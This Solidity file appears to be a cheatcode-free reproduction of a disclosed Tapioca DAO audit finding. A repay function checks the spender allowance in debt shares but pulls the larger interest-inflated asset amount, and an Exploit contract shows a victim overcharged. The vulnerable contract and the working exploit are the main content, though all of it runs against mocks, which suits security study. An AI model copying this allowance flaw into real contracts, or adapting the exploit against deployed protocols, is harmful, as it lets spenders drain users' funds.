// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-44] BigBang::repay and Singularity::repay spend more
    than allowed amount (Code4rena 2023-07-tapioca, reporter zzzitron, #27534).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: allowedBorrow checks `part` (debt share), but _repay converts
    part → elastic `amount` via totalBorrow and pulls `amount` from the granter.
    Once interest accrues (elastic > base), amount > part, so a spender approved
    for 1e18 part can pull >1e18 asset from the granter.
//////////////////////////////////////////////////////////////////////////*/

struct Rebase {
    uint256 elastic;
    uint256 base;
}

library RebaseLib {
    /// @dev sub(part, roundUp) → amount = elastic * part / base (ceil if roundUp)
    function sub(Rebase memory total, uint256 part, bool roundUp)
        internal
        pure
        returns (Rebase memory, uint256 amount)
    {
        if (total.base == 0) {
            amount = part;
        } else {
            amount = (part * total.elastic) / total.base;
            if (roundUp && (amount * total.base) / total.elastic < part) {
                amount += 1;
            }
        }
        total.elastic -= amount;
        total.base -= part;
        return (total, amount);
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal YieldBox holding the debt asset.
contract MockYieldBox {
    MockERC20 public immutable token;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    constructor(MockERC20 t) {
        token = t;
    }

    function setApprovalForAll(address op, bool v) external {
        isApprovedForAll[msg.sender][op] = v;
    }

    function deposit(address from, address to, uint256 amount) external {
        token.transferFrom(from, address(this), amount);
        balanceOf[to] += amount;
    }

    function withdraw(uint256 /*assetId*/, address from, address to, uint256 amount, uint256) external {
        require(from == msg.sender || isApprovedForAll[from][msg.sender], "yb auth");
        balanceOf[from] -= amount;
        token.transfer(to, amount);
    }
}

/// @notice Reduced BigBang repay surface.
contract BigBang {
    using RebaseLib for Rebase;

    MockYieldBox public immutable yieldBox;
    uint256 public constant assetId = 1;

    Rebase public totalBorrow;
    mapping(address => uint256) public userBorrowPart;
    mapping(address => mapping(address => uint256)) public allowanceBorrow;

    constructor(MockYieldBox yb) {
        yieldBox = yb;
    }

    function approveBorrow(address spender, uint256 amount) external {
        allowanceBorrow[msg.sender][spender] = amount;
    }

    function seedBorrow(address user, uint256 part, uint256 elastic) external {
        userBorrowPart[user] = part;
        totalBorrow = Rebase({elastic: elastic, base: part});
    }

    modifier allowedBorrow(address from, uint256 part) {
        if (from != msg.sender) {
            uint256 a = allowanceBorrow[from][msg.sender];
            require(a >= part, "borrow allow");
            if (a != type(uint256).max) allowanceBorrow[from][msg.sender] = a - part;
        }
        _;
    }

    /// @dev Public repay — checks allowance on `part` only.
    function repay(address from, address to, bool /*skim*/, uint256 part)
        external
        allowedBorrow(from, part)
        returns (uint256 amount)
    {
        return _repay(from, to, part);
    }

    /// @dev Verbatim reduction: pulls elastic `amount`, not `part`.
    function _repay(address from, address to, uint256 part) internal returns (uint256 amount) {
        (totalBorrow, amount) = totalBorrow.sub(part, true);

        userBorrowPart[to] -= part;

        // @> VULN: allowance was checked on `part`, but `amount` (elastic) is
        // withdrawn from `from`. When elastic > base (interest), amount > part.
        // FIX: check allowance against `amount` (or convert allowance units).
        yieldBox.withdraw(assetId, from, address(this), amount, 0);
    }
}

contract VictimHelper {
    function approveBorrow(BigBang m, address spender, uint256 part) external {
        m.approveBorrow(spender, part);
    }

    function approveYB(MockYieldBox yb, address op) external {
        yb.setApprovalForAll(op, true);
    }
}

contract Exploit {
    MockERC20 public token;
    MockYieldBox public yieldBox;
    BigBang public market;
    VictimHelper public victim;

    uint256 public constant ALLOWED_PART = 1 ether;
    uint256 public pulled;
    uint256 public overspend;

    constructor() {
        token = new MockERC20();
        yieldBox = new MockYieldBox(token);
        market = new BigBang(yieldBox);
        victim = new VictimHelper();

        // Debtor = address(this). Victim (eoa1) holds YieldBox asset to repay with.
        // Interest accrued: elastic 1.000136... * base (mirrors report ~1000136987569097987).
        uint256 base = 10 ether;
        uint256 elastic = 10 ether + 136987569097987; // > base
        market.seedBorrow(address(this), base, elastic);

        // Victim funds YieldBox and approves market + borrow allowance of 1e18 part.
        token.mint(address(this), 5 ether);
        token.approve(address(yieldBox), type(uint256).max);
        yieldBox.deposit(address(this), address(victim), 5 ether);
        victim.approveYB(yieldBox, address(market));
        victim.approveBorrow(market, address(this), ALLOWED_PART);
    }

    function run() external {
        uint256 beforeBal = yieldBox.balanceOf(address(victim));

        // Spender (this) repays ALLOWED_PART of its own debt using victim's funds.
        uint256 amount = market.repay(address(victim), address(this), false, ALLOWED_PART);

        uint256 afterBal = yieldBox.balanceOf(address(victim));
        pulled = beforeBal - afterBal;
        overspend = pulled - ALLOWED_PART;

        require(amount == pulled, "amount pulled");
        require(pulled > ALLOWED_PART, "harm: pulled more than allowed part");
        require(overspend > 0, "harm: overspend");
    }
}
